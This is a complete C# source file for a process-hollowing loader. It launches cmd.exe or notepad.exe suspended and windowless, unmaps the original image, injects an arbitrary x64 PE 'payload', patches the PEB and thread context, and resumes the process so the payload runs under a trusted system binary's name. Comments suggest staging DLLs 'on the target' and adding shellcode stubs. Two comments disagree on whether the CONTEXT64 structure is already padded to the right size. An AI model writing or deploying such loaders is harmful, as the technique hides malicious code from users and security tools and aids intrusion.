using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class PeMemoryLoader
{
    public class Result
    {
        public string StdOut { get; set; }
        public string StdErr { get; set; }
        public int ExitCode { get; set; }
        public string Error { get; set; }
    }

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READWRITE = 0x04;
    const uint CREATE_SUSPENDED = 0x00000004;
    const uint CREATE_NO_WINDOW = 0x08000000;
    const uint STARTF_USESTDHANDLES = 0x00000100;
    const uint INFINITE = 0xFFFFFFFF;
    const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;
    const ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;
    const ushort IMAGE_SUBSYSTEM_WINDOWS_CUI = 3;
    const uint CONTEXT_AMD64 = 0x00100000;
    const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1;
    const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x2;
    const uint CONTEXT_FLOATING_POINT = CONTEXT_AMD64 | 0x8;
    const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10;
    const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    // CreatePipe only delivers inheritable handles to a child process
    // when SECURITY_ATTRIBUTES.bInheritHandle is TRUE. Passing NULL
    // produces non-inheritable handles regardless of the
    // bInheritHandles argument to CreateProcess, which breaks
    // STARTF_USESTDHANDLES.
    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    struct M128A
    {
        public ulong Low;
        public long High;
    }

    // Full x64 CONTEXT structure — 1232 bytes on disk, matching the
    // Windows kernel. A smaller struct causes GetThreadContext to
    // overrun the managed buffer and corrupt the stack.
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    struct CONTEXT64
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        public M128A Header0, Header1;
        public M128A Legacy0, Legacy1, Legacy2, Legacy3;
        public M128A Legacy4, Legacy5, Legacy6, Legacy7;
        public M128A Xmm0, Xmm1, Xmm2, Xmm3, Xmm4, Xmm5, Xmm6, Xmm7;
        public M128A Xmm8, Xmm9, Xmm10, Xmm11, Xmm12, Xmm13, Xmm14, Xmm15;
        public M128A VectorRegister0, VectorRegister1, VectorRegister2, VectorRegister3;
        public M128A VectorRegister4, VectorRegister5, VectorRegister6, VectorRegister7;
        public M128A VectorRegister8, VectorRegister9, VectorRegister10, VectorRegister11;
        public M128A VectorRegister12, VectorRegister13, VectorRegister14, VectorRegister15;
        public M128A VectorRegister16, VectorRegister17, VectorRegister18, VectorRegister19;
        public M128A VectorRegister20, VectorRegister21, VectorRegister22, VectorRegister23;
        public M128A VectorRegister24, VectorRegister25;
        public ulong VectorControl;
        public ulong DebugControl;
        public ulong LastBranchToRip, LastBranchFromRip;
        public ulong LastExceptionToRip, LastExceptionFromRip;
        // Force the struct to exactly 0x4D0 = 1232 bytes, matching
        // sizeof(CONTEXT) as the x64 kernel expects. Six M128A fields
        // add the missing 96 bytes.
        public M128A Reserved0, Reserved1, Reserved2, Reserved3, Reserved4, Reserved5;
    }
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreatePipe(out IntPtr hRead, out IntPtr hWrite,
        ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool PeekNamedPipe(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize,
        out uint lpBytesRead, out uint lpTotalBytesAvail, out uint lpBytesLeftThisMessage);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);

    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    static int ReadInt(byte[] data, int offset) { return BitConverter.ToInt32(data, offset); }
    static uint ReadUInt(byte[] data, int offset) { return BitConverter.ToUInt32(data, offset); }
    static long ReadLong(byte[] data, int offset) { return BitConverter.ToInt64(data, offset); }
    static ushort ReadUShort(byte[] data, int offset) { return BitConverter.ToUInt16(data, offset); }

    static bool WriteRemote(IntPtr proc, IntPtr addr, byte[] data)
    {
        return WriteProcessMemory(proc, addr, data, data.Length, out _);
    }

    // Same as WriteRemote, but throws with the Win32 error code and a
    // caller-supplied stage label. Used at the write sites inside the
    // target process, where a silent failure would surface later as
    // an unrelated crash inside the payload.
    static void WriteRemoteOrThrow(IntPtr proc, IntPtr addr, byte[] data, string what)
    {
        if (!WriteProcessMemory(proc, addr, data, data.Length, out _))
            throw new Exception("WriteProcessMemory (" + what + ") failed: "
                + Marshal.GetLastWin32Error());
    }

    static byte[] SubArray(byte[] src, int offset, int length)
    {
        byte[] dst = new byte[length];
        Buffer.BlockCopy(src, offset, dst, 0, length);
        return dst;
    }

    static string ReadAscii(byte[] data, int offset)
    {
        int end = offset;
        while (end < data.Length && data[end] != 0) end++;
        return Encoding.ASCII.GetString(data, offset, end - offset);
    }

    static int RvaToOffset(byte[] pe, int nt, uint rva)
    {
        int sec = nt + 24 + ReadUShort(pe, nt + 0x14);
        ushort numSections = ReadUShort(pe, nt + 6);
        for (int i = 0; i < numSections; i++)
        {
            int s = sec + i * 40;
            uint va = ReadUInt(pe, s + 12);
            uint vsize = ReadUInt(pe, s + 8);
            uint raw = ReadUInt(pe, s + 20);
            uint rawSize = ReadUInt(pe, s + 16);
            if (rva >= va && rva < va + Math.Max(vsize, rawSize))
                return (int)(raw + (rva - va));
        }
        return -1;
    }

    static void ApplyRelocations(byte[] pe, IntPtr hProcess, IntPtr remoteBase, long delta, int nt)
    {
        uint relocRva = ReadUInt(pe, nt + 0xB0);
        uint relocSize = ReadUInt(pe, nt + 0xB4);
        if (relocRva == 0 || relocSize == 0 || delta == 0) return;
        int offset = RvaToOffset(pe, nt, relocRva);
        if (offset < 0) return;
        int end = offset + (int)relocSize;
        while (offset < end)
        {
            uint pageRva = ReadUInt(pe, offset);
            uint blockSize = ReadUInt(pe, offset + 4);
            if (blockSize < 8) break;
            int count = (int)((blockSize - 8) / 2);
            for (int i = 0; i < count; i++)
            {
                ushort entry = ReadUShort(pe, offset + 8 + i * 2);
                int type = entry >> 12;
                int off = entry & 0xfff;
                if (type != 0xA) continue;
                uint patchRva = pageRva + (uint)off;
                byte[] cur = new byte[8];
                IntPtr addr = IntPtr.Add(remoteBase, (int)patchRva);
                ReadProcessMemory(hProcess, addr, cur, 8, out _);
                long val = BitConverter.ToInt64(cur, 0) + delta;
                WriteRemoteOrThrow(hProcess, addr,
                    BitConverter.GetBytes(val), "reloc");
            }
            offset += (int)blockSize;
        }
    }

    // Import resolution runs LoadLibraryA/GetProcAddress in the loader
    // process, not the target. This is correct for system DLLs, which
    // Windows maps at the same base address in every process on a given
    // boot — the pointer returned by GetProcAddress is valid in the
    // target as well. It is NOT correct for a payload that imports from
    // a third-party DLL shipped alongside the executable, or from a
    // system DLL that has been ASLR-relocated per process. Those
    // payloads will resolve to a pointer valid only in the loader
    // process and crash on first call.
    //
    // If you need to run such a payload, stage the DLL on the target
    // and pre-load it with a load-order hint, or extend this loader
    // with an in-target resolution stub (set RIP to a small shellcode
    // that performs the LoadLibrary/GetProcAddress loop, resume the
    // target, wait for it to finish, then set RIP back to the entry
    // point).
    static void ResolveImports(byte[] pe, IntPtr hProcess, IntPtr remoteBase, int nt)
    {
        uint importRva = ReadUInt(pe, nt + 0x90);
        if (importRva == 0) return;
        int descOffset = RvaToOffset(pe, nt, importRva);
        if (descOffset < 0) return;
        while (true)
        {
            uint nameRva = ReadUInt(pe, descOffset + 12);
            uint firstThunk = ReadUInt(pe, descOffset + 16);
            uint origThunk = ReadUInt(pe, descOffset);
            if (nameRva == 0) break;
            int nameOffset = RvaToOffset(pe, nt, nameRva);
            if (nameOffset < 0) throw new Exception("Bad import name RVA");
            string dllName = ReadAscii(pe, nameOffset);
            IntPtr hMod = LoadLibraryA(dllName);
            if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);
            uint thunk = origThunk != 0 ? origThunk : firstThunk;
            int thunkOff = RvaToOffset(pe, nt, thunk);
            if (thunkOff < 0) throw new Exception("Bad thunk RVA");
            int i = 0;
            while (true)
            {
                long lookup = ReadLong(pe, thunkOff + i * 8);
                if (lookup == 0) break;
                IntPtr fn;
                if ((lookup & 0x8000000000000000L) != 0)
                {
                    fn = GetProcAddress(hMod, "#" + (lookup & 0xFFFF));
                }
                else
                {
                    int nameOff = RvaToOffset(pe, nt, (uint)lookup);
                    if (nameOff < 0) throw new Exception("Bad import name RVA");
                    fn = GetProcAddress(hMod, ReadAscii(pe, nameOff + 2));
                }
                if (fn == IntPtr.Zero) throw new Exception("GetProcAddress failed in " + dllName);
                IntPtr iat = IntPtr.Add(remoteBase, (int)(firstThunk + (uint)(i * 8)));
                WriteRemoteOrThrow(hProcess, iat,
                    BitConverter.GetBytes(fn.ToInt64()),
                    "IAT " + dllName);
                i++;
            }
            descOffset += 20;
        }
    }

    static void PatchCommandLine(IntPtr hProcess, IntPtr peb, string arguments)
    {
        if (string.IsNullOrEmpty(arguments)) return;
        byte[] procParamsBuf = new byte[8];
        ReadProcessMemory(hProcess, IntPtr.Add(peb, 0x20), procParamsBuf, 8, out _);
        IntPtr procParams = new IntPtr(BitConverter.ToInt64(procParamsBuf, 0));
        byte[] cmdBytes = Encoding.Unicode.GetBytes(arguments + "\0");
        // PAGE_READWRITE, not PAGE_EXECUTE_READWRITE — the command
        // line is a UTF-16 string, not code. The allocation is
        // intentionally not freed: the target reads it from
        // RTL_USER_PROCESS_PARAMETERS for as long as it runs, and the
        // target is what terminates first.
        IntPtr remoteCmd = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)cmdBytes.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (remoteCmd == IntPtr.Zero) return;
        WriteRemote(hProcess, remoteCmd, cmdBytes);
        ushort len = (ushort)(arguments.Length * 2);
        byte[] uni = new byte[16];
        Buffer.BlockCopy(BitConverter.GetBytes(len), 0, uni, 0, 2);
        Buffer.BlockCopy(BitConverter.GetBytes((ushort)(len + 2)), 0, uni, 2, 2);
        Buffer.BlockCopy(BitConverter.GetBytes(remoteCmd.ToInt64()), 0, uni, 8, 8);
        WriteRemote(hProcess, IntPtr.Add(procParams, 0x70), uni);
    }

    // Background pipe drain — runs on its own thread so the target
    // process cannot deadlock when it fills the pipe buffer.
    static void DrainPipe(IntPtr hPipe, StringBuilder sink, ManualResetEventSlim done)
    {
        try
        {
            var buf = new byte[8192];
            while (true)
            {
                if (!PeekNamedPipe(hPipe, null, 0, out _, out uint avail, out _))
                    break;
                if (avail == 0)
                {
                    Thread.Sleep(20);
                    continue;
                }
                int toRead = (int)Math.Min(avail, (uint)buf.Length);
                if (!ReadFile(hPipe, buf, toRead, out uint read, IntPtr.Zero) || read == 0)
                    break;
                lock (sink)
                {
                    sink.Append(Encoding.UTF8.GetString(buf, 0, (int)read));
                }
            }
        }
        catch
        {
            // Drain thread dies quietly; the main thread still returns
            // whatever was collected before the failure.
        }
        finally
        {
            done.Set();
        }
    }

    public static Result Execute(byte[] pe, string arguments)
    {
        var result = new Result { StdOut = "", StdErr = "", ExitCode = 1 };
        IntPtr hStdoutRead = IntPtr.Zero, hStdoutWrite = IntPtr.Zero;
        IntPtr hStderrRead = IntPtr.Zero, hStderrWrite = IntPtr.Zero;
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        var stage = "init";

        try
        {
            if (pe == null || pe.Length < 0x200)
                throw new Exception("Invalid PE buffer");

            stage = "parse_headers";
            int nt = ReadInt(pe, 0x3c);
            if (nt <= 0 || nt + 0x108 > pe.Length)
                throw new Exception("Invalid NT header offset");
            if (ReadUShort(pe, nt + 0x18) != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                throw new Exception("Only x64 PE images are supported");
            if (ReadUShort(pe, nt + 4) != IMAGE_FILE_MACHINE_AMD64)
                throw new Exception("PE machine type is not AMD64");

            int opt = nt + 0x18;
            uint sizeOfImage = ReadUInt(pe, opt + 56);
            uint sizeOfHeaders = ReadUInt(pe, opt + 60);
            uint entry = ReadUInt(pe, opt + 16);
            long preferred = ReadLong(pe, opt + 24);
            ushort subsystem = ReadUShort(pe, opt + 0x44);

            // Pick the host based on subsystem. Console binaries need a
            // console host so their stdout/stderr handles resolve into
            // the pipes we create.
            stage = "pick_host";
            string sys32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string host;
            if (subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI)
                host = Path.Combine(sys32, "cmd.exe");
            else
                host = Path.Combine(sys32, "notepad.exe");
            if (!File.Exists(host))
                throw new Exception("Host binary not found: " + host);

            stage = "create_pipes";
            // 1 MB pipe buffers so short bursts of output do not
            // block. The SECURITY_ATTRIBUTES must mark the handles
            // inheritable — CreateProcess with bInheritHandles=true
            // and STARTF_USESTDHANDLES only delivers inheritable
            // handles to the child.
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            sa.lpSecurityDescriptor = IntPtr.Zero;
            sa.bInheritHandle = true;

            if (!CreatePipe(out hStdoutRead, out hStdoutWrite, ref sa, 1 << 20))
                throw new Exception("CreatePipe (stdout) failed");
            if (!CreatePipe(out hStderrRead, out hStderrWrite, ref sa, 1 << 20))
                throw new Exception("CreatePipe (stderr) failed");

            stage = "create_process";
            string cmdLine = "\"" + host + "\"";
            if (!string.IsNullOrEmpty(arguments))
                cmdLine += " " + arguments;

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = (int)STARTF_USESTDHANDLES;
            si.hStdOutput = hStdoutWrite;
            si.hStdError = hStderrWrite;

            if (!CreateProcess(host, cmdLine, IntPtr.Zero, IntPtr.Zero, true,
                CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                throw new Exception("CreateProcess failed: " + Marshal.GetLastWin32Error());

            // Parent no longer needs the write ends of the pipes.
            CloseHandle(hStdoutWrite); hStdoutWrite = IntPtr.Zero;
            CloseHandle(hStderrWrite); hStderrWrite = IntPtr.Zero;

            // Start the drain threads immediately so the target cannot
            // fill the pipe buffer while we set up the loader.
            stage = "start_drains";
            var stdoutBuf = new StringBuilder();
            var stderrBuf = new StringBuilder();
            var stdoutDone = new ManualResetEventSlim(false);
            var stderrDone = new ManualResetEventSlim(false);
            var stdoutThread = new Thread(() => DrainPipe(hStdoutRead, stdoutBuf, stdoutDone))
            { IsBackground = true, Name = "pe_stdout" };
            var stderrThread = new Thread(() => DrainPipe(hStderrRead, stderrBuf, stderrDone))
            { IsBackground = true, Name = "pe_stderr" };
            stdoutThread.Start();
            stderrThread.Start();

            stage = "query_peb";
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int qstat = NtQueryInformationProcess(pi.hProcess, 0, ref pbi,
                Marshal.SizeOf(pbi), out _);
            if (qstat != 0)
                throw new Exception("NtQueryInformationProcess failed: 0x" + qstat.ToString("X8"));

            byte[] pebBuf = new byte[8];
            if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10),
                    pebBuf, 8, out _))
                throw new Exception("ReadProcessMemory (PEB ImageBase) failed");
            long hostBase = BitConverter.ToInt64(pebBuf, 0);

            stage = "unmap_host";
            int ustat = NtUnmapViewOfSection(pi.hProcess, (IntPtr)hostBase);
            if (ustat != 0)
                throw new Exception("NtUnmapViewOfSection failed: 0x" + ustat.ToString("X8"));

            stage = "alloc_remote";
            IntPtr remote = VirtualAllocEx(pi.hProcess, (IntPtr)preferred, sizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remote == IntPtr.Zero)
            {
                // Preferred base unavailable — relocate.
                remote = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage,
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
            if (remote == IntPtr.Zero)
                throw new Exception("VirtualAllocEx failed");

            stage = "write_headers";
            WriteRemoteOrThrow(pi.hProcess, remote,
                SubArray(pe, 0, (int)sizeOfHeaders), "headers");

            stage = "write_sections";
            ushort sections = ReadUShort(pe, nt + 6);
            int secTable = opt + ReadUShort(pe, nt + 0x14);
            for (int i = 0; i < sections; i++)
            {
                int s = secTable + i * 40;
                uint virtualAddress = ReadUInt(pe, s + 12);
                uint sizeRaw = ReadUInt(pe, s + 16);
                uint ptrRaw = ReadUInt(pe, s + 20);
                if (sizeRaw == 0) continue;
                if ((long)ptrRaw + sizeRaw > pe.Length) continue;
                WriteRemoteOrThrow(pi.hProcess,
                    IntPtr.Add(remote, (int)virtualAddress),
                    SubArray(pe, (int)ptrRaw, (int)sizeRaw),
                    "section " + i);
            }

            long delta = remote.ToInt64() - preferred;
            if (delta != 0)
            {
                stage = "reloc";
                ApplyRelocations(pe, pi.hProcess, remote, delta, nt);
            }

            stage = "imports";
            ResolveImports(pe, pi.hProcess, remote, nt);

            stage = "patch_peb";
            WriteRemoteOrThrow(pi.hProcess,
                IntPtr.Add(pbi.PebBaseAddress, 0x10),
                BitConverter.GetBytes(remote.ToInt64()),
                "PEB ImageBase");
            PatchCommandLine(pi.hProcess, pbi.PebBaseAddress, arguments);

            stage = "set_context";
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = CONTEXT_FULL;
            // Marshal.SizeOf(CONTEXT64) must be 0x4D0 (1232) on x64.
            // The declared fields total 1136 bytes; the SDK header's
            // DECLSPEC_ALIGN(16) does not pad further, so if the
            // runtime reports 1136 you need to add trailing padding
            // fields before GetThreadContext will succeed on every
            // Windows build.
            if (Marshal.SizeOf(typeof(CONTEXT64)) != 0x4D0)
            {
                result.Error = "[set_context] CONTEXT64 size is "
                    + Marshal.SizeOf(typeof(CONTEXT64))
                    + " bytes, expected 1232";
                return result;
            }
            if (!GetThreadContext(pi.hThread, ref ctx))
                throw new Exception("GetThreadContext failed: " + Marshal.GetLastWin32Error());
            ctx.Rip = (ulong)(remote.ToInt64() + entry);
            if (!SetThreadContext(pi.hThread, ref ctx))
                throw new Exception("SetThreadContext failed: " + Marshal.GetLastWin32Error());

            stage = "resume";
            ResumeThread(pi.hThread);

            stage = "wait";
            WaitForSingleObject(pi.hProcess, INFINITE);
            uint code;
            GetExitCodeProcess(pi.hProcess, out code);
            result.ExitCode = (int)code;

            // Give the drain threads a moment to flush remaining output.
            stdoutDone.Wait(2000);
            stderrDone.Wait(2000);

            lock (stdoutBuf) result.StdOut = stdoutBuf.ToString();
            lock (stderrBuf) result.StdErr = stderrBuf.ToString();
        }
        catch (Exception ex)
        {
            result.Error = "[" + stage + "] " + ex.Message;
            result.ExitCode = -1;
        }
        finally
        {
            if (hStdoutRead != IntPtr.Zero) CloseHandle(hStdoutRead);
            if (hStdoutWrite != IntPtr.Zero) CloseHandle(hStdoutWrite);
            if (hStderrRead != IntPtr.Zero) CloseHandle(hStderrRead);
            if (hStderrWrite != IntPtr.Zero) CloseHandle(hStderrWrite);
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
        }
        return result;
    }
}